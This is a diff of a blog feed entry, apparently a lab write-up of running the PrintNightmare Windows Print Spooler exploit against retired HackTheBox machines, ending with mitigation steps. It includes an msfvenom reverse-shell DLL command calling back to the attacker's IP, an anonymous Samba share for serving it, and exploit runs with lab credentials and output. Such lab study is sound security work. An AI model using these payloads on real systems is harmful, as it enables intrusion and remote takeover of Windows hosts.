@@ -13,14 +13,84 @@
       
       <guid>https://fahmifj.github.io/blog/play-with-printnightmare/</guid>
       <description>Having fun with a Zero-Day vulnerability</description>
-      <content:encoded><![CDATA[<p>For the past week, a lot of InfoSec pros I follow on Twitter were <em>tweeting</em> about a remote code execution vulnerability in the Windows Print  Spooler service that could be used for privilege escalation, and, furthermore, it affects all the Windows versions. Microsoft has assigned CVE-2021-34527 to this vulnerability, which is now publicly known as PrintNightmare.  This vulnerability was accidentally disclosed by security researchers from China, Zhiniang Peng and Xuefeng Li, after Microsoft released a security patch on June 8, 2021 for CVE-2021-1675, which is also a remote code execution in the Windows Print Spooler service. The researchers thought their finding was CVE-2021-1675, but it turned out to be different.</p>
-<p>I’m neither an expert nor an infosec pro, so I won’t dive into any technical thing about the vulnerability, but in this post, I would like to play with the vulnerability using <a href="http://hackthebox.eu/">HackTheBox</a> <a href="https://www.hackthebox.eu/newsroom/htb-take-it-easy-july-2021">retired machines</a> as targets.</p>
+      <content:encoded><![CDATA[<p>For the past week, a lot of InfoSec pros I follow on Twitter were <em>tweeting</em> about a remote code execution vulnerability in the Windows Print  Spooler service that could be used for privilege escalation, and furthermore, it affects all the Windows versions. Microsoft has assigned CVE-2021-34527 to the vulnerability, which is now publicly known as PrintNightmare.  This vulnerability was accidentally disclosed by security researchers from China, Zhiniang Peng and Xuefeng Li, after Microsoft released a security patch on June 8, 2021 for CVE-2021-1675, which is also a remote code execution in the Print Spooler service. The researchers thought their finding was CVE-2021-1675, but it turned out to be different.</p>
+<p>I’m neither an expert nor an infosec pro, so I won’t dive into any technical thing about the vulnerability. In this post, I just want to play with the vulnerability using <a href="http://hackthebox.eu/">HackTheBox</a> <a href="https://www.hackthebox.eu/newsroom/htb-take-it-easy-july-2021">retired machines</a> as targets.</p>
 <p><strong>[Updated 03-03-2021]</strong></p>
 <ul>
 <li>Update clarity</li>
 </ul>
-<h2 id="target-machines">Target Machines</h2>
-<p>The following are the retired Windows machines from HackTheBox along with a low privilege user that I will use to play with PrintNightmare.</p>
+<h2 id="preparation">Preparation</h2>
+<p>There are several PoC exploits out there for PrintNightmare, but I will use the one that created by <a href="https://www.hackthebox.eu/profile/9164">Cube0x0</a>. To use the exploit, I will have to change my impacket version to the one that has been modified by Cube0x0.  But, changing the currently installed Impacket could potentially mess up my Kali. Therefore, I will use a Python virtual environment using <code>virtualenv</code> module. If I don&rsquo;t have it, I can run the following command to install the module.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ python3 -m pip install virtualenv
+</code></pre></div><p>The exploit also requires a DLL for later to be loaded on the target machines. This DLL will be hosted on a Samba server, and it must be configured to allow anonymous access, so that the exploit can directly grab the DLL .</p>
+<p>That said, I have some preparations to do.</p>
+<h4 id="working-directory">Working Directory</h4>
+<p>The first one is a working directory/folder, which I will create one under <code>/opt</code> called <code>printnightmare</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «opt» «10.10.14.75» 
+$ mkdir printnightmare <span class="o">&amp;&amp;</span> <span class="nb">cd</span> printnightmare
+</code></pre></div><p>Inside the <code>printnightmare</code> , I will clone the cube0x0 impacket as well as the exploit (<code>CVE-2021-1675-cube0x0</code>).</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «printnightmare» «10.10.14.75» 
+$ git clone https://github.com/cube0x0/impacket <span class="o">&amp;&amp;</span> git clone https://github.com/cube0x0/CVE-2021-1675.git CVE-2021-1675-cube0x0
+</code></pre></div><p>Next, I will create a virtual environment called  <code>impacket-venv</code> using <code>virtualenv</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «printnightmare» «10.10.14.75» 
+$ virtualenv impacket-venv
+created virtual environment CPython3.9.2.final.0-64 in 614ms
+  creator CPython3Posix<span class="o">(</span><span class="nv">dest</span><span class="o">=</span>/opt/printnightmare/impacket-venv, <span class="nv">clear</span><span class="o">=</span>False, <span class="nv">no_vcs_ignore</span><span class="o">=</span>False, <span class="nv">global</span><span class="o">=</span>False<span class="o">)</span>
+  seeder FromAppData<span class="o">(</span><span class="nv">download</span><span class="o">=</span>False, <span class="nv">pip</span><span class="o">=</span>bundle, <span class="nv">setuptools</span><span class="o">=</span>bundle, <span class="nv">wheel</span><span class="o">=</span>bundle, <span class="nv">via</span><span class="o">=</span>copy, <span class="nv">app_data_dir</span><span class="o">=</span>/home/kali/.local/share/virtualenv<span class="o">)</span>
+    added seed packages: <span class="nv">pip</span><span class="o">==</span>21.1.3, <span class="nv">setuptools</span><span class="o">==</span>57.1.0, <span class="nv">wheel</span><span class="o">==</span>0.36.2
+  activators BashActivator,CShellActivator,FishActivator,PowerShellActivator,PythonActivator,XonshActivator
+</code></pre></div><p>Then, I will activate the virtual environment with the following commands.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «printnightmare» «10.10.14.75» 
+$ <span class="nb">source</span> impacket-venv/bin/activate
+</code></pre></div><p>Now I can just install the cube0x0 impacket.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">(</span>impacket-venv<span class="o">)</span> → kali@kali «printnightmare» «10.10.14.75» 
+$ <span class="nb">cd</span> impacket <span class="o">&amp;&amp;</span> python3 setup.py install
+running install
+running bdist_egg
+running egg_info
+...<span class="o">[</span>SNIP<span class="o">]</span>...
+</code></pre></div><h4 id="dll-payload">DLL Payload</h4>
+<p>Before generating a DLL, I will create a <code>dll</code> folder first under the <code>printnightmare</code> folder.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">(</span>impacket-venv<span class="o">)</span> → kali@kali «printnightmare» «10.10.14.75» 
+$ mkdir dll
+</code></pre></div><p>I will be using <code>msfvenom</code> to generate the DLL . Upon a successful exploitation, this DLL will connects back to my attacking machine on port 4444, in short, it&rsquo;s a reverse shell.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">(</span>impacket-venv<span class="o">)</span> → kali@kali «dll» «10.10.14.75» 
+$ msfvenom -p windows/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.75 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span> -f dll &gt; revshell.dll  
+<span class="o">[</span>-<span class="o">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+<span class="o">[</span>-<span class="o">]</span> No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: <span class="m">460</span> bytes
+Final size of dll file: <span class="m">8704</span> bytes
+</code></pre></div><blockquote>
+<p>If you want to compile your own, go <a href="https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/dll-hijacking#your-own">here</a> or see <a href="#troubleshoot">Troubleshoot</a></p>
+</blockquote>
+<h4 id="samba-server-configuration">Samba Server Configuration</h4>
+<p>In the exploit repo, cube0x0 also provides a guide on how to configure a Samba server for hosting the DLL payload. I will follow cube0x0&rsquo;s guide, but I will add some additional lines for logging to the configuration file.</p>
+<p>First, I will create a backup of the original Samba configuration file.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">(</span>impacket-venv<span class="o">)</span> → kali@kali «printnightmare» «10.10.14.75» 
+$ sudo cp /etc/samba/smb.conf<span class="o">{</span>,.bak<span class="o">}</span>
+</code></pre></div><p>Then I will replace the entire <code>smb.conf</code> contents with the following:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">[global]
+   server role = standalone server
+   smb ports = 445
+   map to guest = bad user
+   usershare allow guests = yes
+   idmap config * : backend = tdb
+   log file = /var/log/samba/log.%m
+   max log size = 1000
+   logging = file
+   
+[ef]
+    comment = Samba
+    path = /opt/printnightmare/dll
+    guest ok = yes
+    read only = no
+    browsable = yes
+</code></pre></div><p>Lastly, I will start the Samba service.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">(</span>impacket-venv<span class="o">)</span> → kali@kali «printnightmare» «10.10.14.75» 
+$ sudo systemctl start smbd 
+</code></pre></div><h2 id="target-machines">Target Machines</h2>
+<p>As stated previously, I will be using HackTheBox retired machines as the targets. Here are the retired Windows machines that I will use along with their low privilege users.</p>
 <div class="table-wrapper" >
 <table>
 <thead>
@@ -59,80 +129,7 @@
 </tbody>
 </table>
 </div>
-<h2 id="preparation">Preparation</h2>
-<p>There are several exploit PoC for PrintNightmare, but I will use the one that created by <a href="https://www.hackthebox.eu/profile/9164">Cube0x0</a>. To use the exploit, I will have to change my impacket version to the one that has been modified by Cube0x0.</p>
-<p>But, changing the currently installed Impacket could potentially mess up my Kali. Therefore, I will use a Python virtual environment using <code>virtualenv</code> module. If I don&rsquo;t have it, I can run the following command to install the module.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ python3 -m pip install virtualenv
-</code></pre></div><p>The exploit also requires a DLL for later to be loaded on the target machines. This DLL will be hosted on a Samba server, and it must be configured to allow anonymous access, so that the exploit can directly grab the DLL .</p>
-<p>That&rsquo;s being said, I will do some preparation.</p>
-<h3 id="working-directory">Working Directory</h3>
-<p>The first one is a working directory/folder, which I will create one in <code>/opt</code> called <code>printnightmare</code>.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «opt» «10.10.14.75» 
-$ mkdir printnightmare <span class="o">&amp;&amp;</span> <span class="nb">cd</span> printnightmare
-</code></pre></div><p>Inside the <code>printnightmare</code> , I will clone the cube0x0 impacket as well as the exploit (<code>CVE-2021-1675-cube0x0</code>).</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «printnightmare» «10.10.14.75» 
-$ git clone https://github.com/cube0x0/impacket <span class="o">&amp;&amp;</span> git clone https://github.com/cube0x0/CVE-2021-1675.git CVE-2021-1675-cube0x0
-</code></pre></div><p>Next, I will create a virtual environment called  <code>impacket-venv</code> using <code>virtualenv</code>.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «printnightmare» «10.10.14.75» 
-$ virtualenv impacket-venv
-created virtual environment CPython3.9.2.final.0-64 in 614ms
-  creator CPython3Posix<span class="o">(</span><span class="nv">dest</span><span class="o">=</span>/opt/printnightmare/impacket-venv, <span class="nv">clear</span><span class="o">=</span>False, <span class="nv">no_vcs_ignore</span><span class="o">=</span>False, <span class="nv">global</span><span class="o">=</span>False<span class="o">)</span>
-  seeder FromAppData<span class="o">(</span><span class="nv">download</span><span class="o">=</span>False, <span class="nv">pip</span><span class="o">=</span>bundle, <span class="nv">setuptools</span><span class="o">=</span>bundle, <span class="nv">wheel</span><span class="o">=</span>bundle, <span class="nv">via</span><span class="o">=</span>copy, <span class="nv">app_data_dir</span><span class="o">=</span>/home/kali/.local/share/virtualenv<span class="o">)</span>
-    added seed packages: <span class="nv">pip</span><span class="o">==</span>21.1.3, <span class="nv">setuptools</span><span class="o">==</span>57.1.0, <span class="nv">wheel</span><span class="o">==</span>0.36.2
-  activators BashActivator,CShellActivator,FishActivator,PowerShellActivator,PythonActivator,XonshActivator
-</code></pre></div><p>Then, I will activate the virtual environment with the following commands.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «printnightmare» «10.10.14.75» 
-$ <span class="nb">source</span> impacket-venv/bin/activate
-</code></pre></div><p>Now I can just install the cube0x0 impacket.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">(</span>impacket-venv<span class="o">)</span> → kali@kali «printnightmare» «10.10.14.75» 
-$ <span class="nb">cd</span> impacket <span class="o">&amp;&amp;</span> python3 setup.py install
-running install
-running bdist_egg
-running egg_info
-...<span class="o">[</span>SNIP<span class="o">]</span>...
-</code></pre></div><h3 id="generate-malicious-dll">Generate Malicious DLL</h3>
-<p>The next step is generating a DLL payload.</p>
-<p>Under the <code>printnightmare</code> folder, I will create a <code>dll</code> folder.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">(</span>impacket-venv<span class="o">)</span> → kali@kali «printnightmare» «10.10.14.75» 
-$ mkdir dll
-</code></pre></div><p>I could generate the DLL with help of <code>msfvenom</code> . Upon a successful exploitation, this DLL will connects back to my attacking machine on port 4444, in short, it&rsquo;s a reverse shell.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">(</span>impacket-venv<span class="o">)</span> → kali@kali «dll» «10.10.14.75» 
-$ msfvenom -p windows/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.75 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span> -f dll &gt; revshell.dll  
-<span class="o">[</span>-<span class="o">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
-<span class="o">[</span>-<span class="o">]</span> No arch selected, selecting arch: x64 from the payload
-No encoder specified, outputting raw payload
-Payload size: <span class="m">460</span> bytes
-Final size of dll file: <span class="m">8704</span> bytes
-</code></pre></div><p>The DLL generated under <code>/opt/printnightmare/dll/[here]</code>.</p>
-<blockquote>
-<p>If you want to compile your own, go <a href="https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/dll-hijacking#your-own">here</a> or see <a href="https://fahmifj.github.io/blog/play-with-printnightmare/#troubleshoot">Troubleshoot</a></p>
-</blockquote>
-<h3 id="samba-configuration">Samba Configuration</h3>
-<p>In the exploit repo, cube0x0 also provides a guide on how to configure a Samba server for hosting the DLL payload. I will follow cube0x0&rsquo;s guide, but I will add some additional lines for logging to the configuration file.</p>
-<p>First, I will create a backup of the original Samba configuration file.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">(</span>impacket-venv<span class="o">)</span> → kali@kali «printnightmare» «10.10.14.75» 
-$ sudo cp /etc/samba/smb.conf<span class="o">{</span>,.bak<span class="o">}</span>
-</code></pre></div><p>Then I will replace the entire <code>smb.conf</code> contents with the following:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">[global]
-   server role = standalone server
-   smb ports = 445
-   map to guest = bad user
-   usershare allow guests = yes
-   idmap config * : backend = tdb
-   log file = /var/log/samba/log.%m
-   max log size = 1000
-   logging = file
-   
-[ef]
-    comment = Samba
-    path = /opt/printnightmare/dll
-    guest ok = yes
-    read only = no
-    browsable = yes
-</code></pre></div><p>Lastly, I will start the Samba service.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">(</span>impacket-venv<span class="o">)</span> → kali@kali «printnightmare» «10.10.14.75» 
-$ sudo systemctl start smbd 
-</code></pre></div><h2 id="target-scanning">Target Scanning</h2>
+<h2 id="target-scanning">Target Scanning</h2>
 <p>According to <a href="https://www.splunk.com/en_us/blog/security/i-pity-the-spool-detecting-printnightmare-cve-2021-34527.html">this blog post</a> by Splunk Threat Researcher Team, there are three prerequisites for successful exploitation of PrintNightmare:</p>
 <ol>
 <li>Print Spooler Service enabled on the target system ❔</li>
@@ -141,7 +138,7 @@ $ sudo systemctl start smbd
 </ol>
 <p>Now to check if the Print Spooler service enabled, I could follow cube0x0&rsquo;s instruction by using a tool from impacket called <code>rpcdump.py</code>.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ rpcdump.py @<span class="o">[</span>IP-ADDRESS<span class="o">]</span> <span class="p">|</span> egrep <span class="s1">&#39;MS-RPRN|MS-PAR&#39;</span>
-</code></pre></div><p>I found out that <code>rpcclient</code> can also be used to detect the Print Spooler service by invoking <code>enumprinters</code> command. If the returned output is <strong>&ldquo;Could not initialise spoolss&rdquo;</strong>, then the Print Spooler is most likely to be disabled.</p>
+</code></pre></div><p><code>rpcclient</code> can also be used to detect the availability of Print Spooler service by invoking <code>enumprinters</code> command. If the returned output is <strong>&ldquo;Could not initialise spoolss&rdquo;</strong>, then the Print Spooler is most likely to be disabled.</p>
 <p>The following is a dirty bash script I created to do both using <code>rpcdump.py</code> and <code>rpcclient</code> in one run.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="cp">#!/bin/sh
 </span><span class="cp"></span>
@@ -188,9 +185,7 @@ No printers returned.
 $ python3 CVE-2021-1675.py active.htb/SVC_TGS:<span class="s1">&#39;GPPstillStandingStrong2k18&#39;</span>@10.10.10.100 <span class="s1">&#39;\\10.10.14.75\ef\revshell.dll&#39;</span>
 <span class="o">[</span>*<span class="o">]</span> Connecting to ncacn_np:10.10.10.100<span class="o">[</span><span class="se">\P</span>IPE<span class="se">\s</span>poolss<span class="o">]</span>
 <span class="o">[</span>-<span class="o">]</span> Connection Failed
-</code></pre></div><p><img class="img-container" src="imgs/image-20210718002853259.png" alt="image-20210718002853259"  />
-</p>
-<h3 id="101010134-bastion">[10.10.10.134] Bastion</h3>
+</code></pre></div><h3 id="101010134-bastion">[10.10.10.134] Bastion</h3>
 <p>I ran the exploit against Bastion, but the DLL got removed by AV 😂.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">(</span>impacket-venv<span class="o">)</span> → kali@kali «CVE-2021-1675-cube0x0» «10.10.14.75» git:<span class="o">(</span>main<span class="o">)</span> 
 $ python3 CVE-2021-1675.py Bastion/l4mpje:<span class="s1">&#39;bureaulampje&#39;</span>@10.10.10.134 <span class="s1">&#39;\\10.10.14.75\ef\revshell.dll&#39;</span>
@@ -202,9 +197,7 @@ $ python3 CVE-2021-1675.py Bastion/l4mpje:<span class="s1">&#39;bureaulampje&#39
 Traceback <span class="o">(</span>most recent call last<span class="o">)</span>:
 ...<span class="o">[</span>SNIP<span class="o">]</span>...
 impacket.dcerpc.v5.rprn.DCERPCSessionError: RPRN SessionError: code: 0xe1 - ERROR_VIRUS_INFECTED - Operation did not <span class="nb">complete</span> successfully because the file contains a virus or potentially unwanted software
-</code></pre></div><p><img class="img-container" src="imgs/image-20210718002921209.png" alt="image-20210718002921209"  />
-</p>
-<p>No problem! The conclusion here is that Bastion was vulnerable.</p>
+</code></pre></div><p>No problem! The conclusion here is that Bastion was vulnerable.</p>
 <h3 id="101010134-heist">[10.10.10.134] Heist</h3>
 <p>On Heist, the exploit didn&rsquo;t show an indication of a successful exploitation.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">(</span>impacket-venv<span class="o">)</span> → kali@kali «CVE-2021-1675-cube0x0» «10.10.14.75» git:<span class="o">(</span>main<span class="o">)</span> 
@@ -250,17 +243,13 @@ Ethernet adapter Ethernet0 2:
    Subnet Mask . . . . . . . . . . . : 255.255.255.0
    Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:271c%15
                                        10.10.10.2
-</code></pre></div><p><img class="img-container" src="imgs/image-20210717130728398.png" alt="image-20210717130728398"  />
-</p>
-<h3 id="101010161-forest">[10.10.10.161] Forest</h3>
+</code></pre></div><h3 id="101010161-forest">[10.10.10.161] Forest</h3>
 <p>Like on Active, the exploit also failed on Forest</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">(</span>impacket-venv<span class="o">)</span> → kali@kali «CVE-2021-1675-cube0x0» «10.10.14.75» git:<span class="o">(</span>main<span class="o">)</span> 
 $ python3 CVE-2021-1675.py htb.local/svc-alfresco:<span class="s1">&#39;s3rvice&#39;</span>@10.10.10.161 <span class="s1">&#39;\\10.10.14.75\ef\revshell.dll&#39;</span>
 <span class="o">[</span>*<span class="o">]</span> Connecting to ncacn_np:10.10.10.161<span class="o">[</span><span class="se">\P</span>IPE<span class="se">\s</span>poolss<span class="o">]</span>
 <span class="o">[</span>-<span class="o">]</span> Connection Failed
-</code></pre></div><p><img class="img-container" src="imgs/image-20210718002812865.png" alt="image-20210718002812865"  />
-</p>
-<h3 id="101010237-atom">[10.10.10.237] Atom</h3>
+</code></pre></div><h3 id="101010237-atom">[10.10.10.237] Atom</h3>
 <p>On Atom, the exploit returned the same result as on Heist, no indication of a successful exploitation.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">(</span>impacket-venv<span class="o">)</span> → kali@kali «CVE-2021-1675-cube0x0» «10.10.14.75» git:<span class="o">(</span>main<span class="o">)</span> 
 $ python3 CVE-2021-1675.py ATOM/jason:<span class="s1">&#39;kidvscat_electron_@123&#39;</span>@10.10.10.237 <span class="s1">&#39;\\10.10.14.75\ef\revshell.dll&#39;</span>
@@ -307,13 +296,11 @@ Ethernet adapter Ethernet0:
    Subnet Mask . . . . . . . . . . . : 255.255.255.0
    Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:271c%6
                                        10.10.10.2
-</code></pre></div><p><img class="img-container" src="imgs/image-20210717125927762.png" alt="image-20210717125927762"  />
-</p>
-<h2 id="troubleshoot">Troubleshoot</h2>
+</code></pre></div><h2 id="troubleshoot">Troubleshoot</h2>
 <h3 id="status_pipe_closing">STATUS_PIPE_CLOSING</h3>
 <p>I&rsquo;m sure that the following error is caused by my DLL payload.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">impacket.smb3.SessionError: SMB SessionError: STATUS_PIPE_CLOSING(The specified named pipe is in the closing state.)
-</code></pre></div><p>This is probably because, instead of using the DLL to create a user (one time load / execution), I use the DLL for reverse shell.</p>
+</code></pre></div><p>This is probably because, instead of using the DLL to create a user (one time load / execution / thread), I use the DLL for reverse shell.</p>
 <p><del>I wanted to generate my own payload to test but my Visual Studio somehow didn&rsquo;t want me to install the Windows SDK</del>  (Fixed on <a href="https://fahmifj.github.io/blog/windows-10-troubleshoot-permissions/">this post</a>).</p>
 <p>So I stole <a href="https://github.com/fahmifj/PrintNightmare-kit/blob/main/generate-nightmaredll.ps1">this payload</a> from this <a href="https://github.com/calebstewart/CVE-2021-1675">PoC</a> created by Caleb Stewart and John Hammond.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">PS /opt/PrintNightmare/dll&gt; Import-Module ./generate-nightmaredll.ps1
@@ -395,8 +382,7 @@ $ reg add HKLM<span class="se">\S</span>OFTWARE<span class="se">\M</span>icrosof
 <li>Disable Print Spooler service</li>
 <li>Disable inbound remote printing through Group Policy.</li>
 </ul>
-<p>Also, it is recommended to install <a href="https://support.microsoft.com/topic/31b91c02-05bc-4ada-a7ea-183b129578a7">KB5005010</a> patch.</p>
-<p>As for the second option, I have no idea to work with that from CLI, so I will just try the first option.</p>
+<p>Also, it is recommended to install <a href="https://support.microsoft.com/topic/31b91c02-05bc-4ada-a7ea-183b129578a7">KB5005010</a> patch.  As for the second option, I have no idea to work with that from CLI, so I will demo the first option.</p>
 <h3 id="disable-print-spooler-service">Disable Print Spooler Service</h3>
 <p>First, determine if the Print Spooler Service is running by using  <code>Get-Service -Name Spooler</code> in PowerShell. If the service is running, stop and disable it by running the following commands in PowerShell consecutively.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ Stop-Service -Name Spooler -Force
